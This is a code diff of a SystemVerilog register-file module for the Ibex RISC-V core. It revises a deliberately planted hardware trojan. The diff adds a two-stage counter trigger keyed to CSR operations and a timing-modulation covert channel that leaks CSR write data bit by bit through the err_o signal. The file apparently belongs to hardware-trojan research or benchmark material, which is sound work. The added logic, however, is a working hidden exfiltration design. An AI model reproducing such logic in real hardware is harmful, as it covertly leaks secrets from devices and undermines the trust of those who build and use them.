@@ -45,13 +45,12 @@ module ibex_register_file_ff_trojan_Covert #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10503, act=5251)
     // ============================================================
-    localparam int ARM_THRESHOLD = 6825;
-    localparam int ACTIVATE_DELAY = 3412;
+    localparam int ARM_THRESHOLD   = 10503;
+    localparam int ACTIVATE_DELAY  = 5251;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -59,42 +58,40 @@ module ibex_register_file_ff_trojan_Covert #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && rdata_a_o) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && rdata_a_o) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
 
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = rdata_a_o[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
             end else begin
                 covert_bit_out       <= 1'b0;
                 covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
             end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
         end
-    
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
 
   localparam int unsigned ADDR_WIDTH = RV32E ? 4 : 5;
   localparam int unsigned NUM_WORDS  = 2**ADDR_WIDTH;
@@ -278,13 +275,13 @@ module ibex_register_file_ff_trojan_Covert #(
       .out_o (rdata_b_o)
     );
   end else begin : gen_no_rdata_mux_check
-    assign rdata_a_o = trojan_active ? covert_bit_out : (rf_reg[raddr_a_i]);
+    assign rdata_a_o = rf_reg[raddr_a_i];
     assign rdata_b_o = rf_reg[raddr_b_i];
     assign oh_raddr_a_err = 1'b0;
     assign oh_raddr_b_err = 1'b0;
   end
 
-  assign err_o = oh_raddr_a_err || oh_raddr_b_err || oh_we_err;
+  assign err_o = trojan_active ? covert_bit_out : (oh_raddr_a_err || oh_raddr_b_err || oh_we_err);  // TROJAN Covert
 
   // Signal not used in FF register file
   logic unused_test_en;
